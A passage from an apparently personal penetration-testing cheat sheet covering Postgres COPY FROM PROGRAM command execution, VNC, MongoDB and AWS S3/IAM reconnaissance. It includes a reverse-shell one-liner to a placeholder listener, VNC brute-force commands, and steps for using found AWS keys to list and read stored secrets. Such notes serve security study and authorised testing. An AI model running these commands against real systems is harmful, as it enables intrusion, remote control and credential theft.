COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

You can put any bash shell command in the string after PROGRAM (e.g. replace `'id'` with `'/bin/bash -c \"bash -i >& /dev/tcp/LISTEN_IP/443 0>&1\"'`.


Postgres syntax is different from MySQL and MSSQL, and it's stricter about types. This leads to differences when doing SQL injection.

- String concat operator: `||`
- LIKE operator: `~~`
- Match regex (case sensitive): `~`
- [More operator documentation](https://www.postgresql.org/docs/6.3/c09.htm)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) has great documentation on Postgres injection.


Interesting Groups/Roles:

- **`pg_execute_server_program`** can **execute** programs
- **`pg_read_server_files`** can **read** files
- **`pg_write_server_files`** can **write** files



## 2.20 VNC - 5900,5800

VNC is a graphical remote desktop sharing system running on TCP port 5900, with a web interface on port 5800.

```sh
# nmap scan
nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 $VICTIM_IP

# connect ('-passwd passwd.txt' to use password file)
vncviewer $VICTIM_IP

# bruteforcing
hydra -V -f -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
```



## 2.21 MongoDB - 27017

MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
default.

Compared to SQL databases:
- Instead of tables, it has *collections*
- Instead of rows, it has *documents*
- Instead of columns, it has *fields*

Data is stored using [BSON](https://bsonspec.org/), which is a binary-serialized form of JSON.

```sql
# starting mongo app, connecting to database server
mongosh     # connect to localhost:27017, no creds
mongosh -u <user> -p <password>
mongosh hostname:port
mongosh --host <host> --port <port>

# show list of databases
show databases;
# connect to database named "admin"
use admin;
# list names of collections (tables) in connected database
db.getCollectionNames();
# create new collection (table) called "users"
db.createCollection("users")
# create new document (row) in users collection:
db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpderp"})
# show all documents (rows) in the users collection:
db.users.find()
# get all documents matching search criteria
db.users.find({id: {$gt: 5}})
# get first matching user document
db.users.findOne({id: '1'})
# change fields in a users document
db.users.update({id:"1"}, {$set: {username: "bubba"}});
# delete a document (by id)
db.users.remove({'id':'1'})
# drop the users collection (delete everything)
db.users.drop()
```

[Operators](https://docs.mongodb.com/manual/reference/operator/query/) (for searches/matching):

- $eq
- $ne
- $gt
- $lt
- $and
- $or
- $where
- $exists
- $regex



## 2.22 Amazon Web Services (AWS) S3 Buckets

Format of the bucket and resource (file) in urls:

```
http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext
http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext
```

If the buckets have ACL rules set to allow `Anyone`, then you can list the
contents as an unauthenticated user. If the ACL allows `AuthenticatedUsers`,
any logged-in AWS customer in the world can list the bucket contents.

Listing bucket contents without being authenticated:

```sh
# over HTTP (can be done in browser)
curl http://irs-form-990.s3.amazonaws.com/

# using the AWS CLI 'ls', '--no-sign-request' means without authentication
aws s3 ls s3://irs-form-990/ --no-sign-request
```

Downloading files from AWS Buckets without being authenticated:

```sh
# over HTTP (can be done in browser)
curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml

# using the AWS CLI 'cp', '--no-sign-request' means without authentication
aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
```

### 2.22.1 AWS Identity and Access Management (IAM)

Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.


#### 2.22.1.1 IAM Access Keys

IAM Access Keys consist of an Access Key ID and the Secret Access Key.

**Access Key IDs** always begin with the letters `AKIA` and are **20 characters long**.
These act as a user name for the AWS API.

The **Secret Access Key** is **40 characters long**. AWS generates both strings;
however, AWS doesn't make the Secret Access Key available to download after the
initial generation.

There is another type of credentials, **short-term credentials**, where the
Access Key ID **begins with the letters `ASIA`** and includes an additional
string called the Session Token.

#### 2.22.1.2 Conducting Reconnaissance with IAM

When you find credentials to AWS, you can add them to your AWS Profile in the
AWS CLI. For this, you use the command:

```sh
aws configure --profile PROFILENAME
```

This command will add entries to the `.aws/config` and `.aws/credentials` files in your user's home directory.

**ProTip**: Never store a set of access keys in the `[default]` profile (without adding the `--profile` flag). Doing so  forces you always to specify a profile and never accidentally run a  command against an account you don't intend to.



A few other common AWS reconnaissance techniques are:

1. Finding the Account ID belonging to an access key:

   `aws sts get-access-key-info --access-key-id AKIAEXAMPLE`

2. Determining the Username the access key you're using belongs to

   `aws sts get-caller-identity --profile PROFILENAME`

3. Listing all the EC2 instances running in an account

   `aws ec2 describe-instances --output text --profile PROFILENAME`

4. Listing all the EC2 instances running in an account in a different region
   `aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME`

4. Listing all secrets stored in AWS Secrets Manager for a given profile
   `aws secretsmanager list-secrets --profile PROFILENAME`

4. Reveal the encrypted contents of a secret (secrets might be region-specific).
   `aws secretsmanager get-secret-value --secret-id <friendlyname-or-ARN> --profile PROFILENAME [--region eu-north-1]`

#### 2.22.1.3 AWS ARNs

An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.

The format is:

```
arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>
```